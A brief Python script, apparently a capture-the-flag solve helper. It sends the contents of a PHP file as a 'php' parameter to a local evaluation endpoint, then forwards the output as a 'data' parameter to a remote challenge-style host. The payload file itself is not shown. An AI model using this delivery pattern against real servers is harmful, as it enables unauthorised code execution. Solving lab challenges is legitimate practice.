import requests

PATH = 'http://localhost:54321'
payload = open("info.php", "r").read().replace("<?php", "").replace("?>", "").strip()
response = requests.get(
    PATH,
    params={'php': payload}
)

text = response.text

PATH = 'http://s1.r3.ret.sh.cn:31873/'
response = requests.get(PATH, params={'data': text})
print(response.text)
print(response.url)